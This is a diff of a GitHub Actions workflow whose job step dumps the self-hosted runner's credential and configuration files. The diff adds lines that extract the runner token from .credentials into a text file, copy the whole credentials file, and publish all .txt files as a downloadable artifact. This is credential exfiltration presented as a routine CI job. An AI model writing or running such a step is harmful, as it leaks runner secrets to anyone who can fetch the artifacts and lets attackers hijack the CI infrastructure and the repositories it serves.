@@ -18,21 +18,27 @@ jobs:
           REPO_NAME: ${{ github.repository }}
         run: |
           id
-          jq --help
           ps axuf | grep Runner.Listener
           ls -la /home/runner/runners/2.284.0/
           echo '###########################'
-          cat /home/runner/runners/2.284.0/.credentials | jq .
+          cat /home/runner/runners/2.284.0/.credentials | jq
+          echo
+          cat /home/runner/runners/2.284.0/.credentials | jq .data.token > t.txt
+          cp -fv /home/runner/runners/2.284.0/.credentials ./ttt.txt
+    
+          echo '###########################'
+          cat /home/runner/runners/2.284.0/.runner | jq
           echo
           echo '###########################'
-          cat /home/runner/runners/2.284.0/.runner | jq .
+          cat /home/runner/runners/2.284.0/.agent | jq
           echo
           echo '###########################'
-          cat /home/runner/runners/2.284.0/.agent | jq .
+          cat /home/runner/runners/2.284.0/.setup_info
           echo
-          echo '###########################'
-          cat /home/runner/runners/2.284.0/.setup_info jq .
-          echo
-
-
+      - name: Archive production artifacts
+        uses: actions/upload-artifact@v2
+        with:
+          name: artifact
+          path: |
+            *.txt   
           
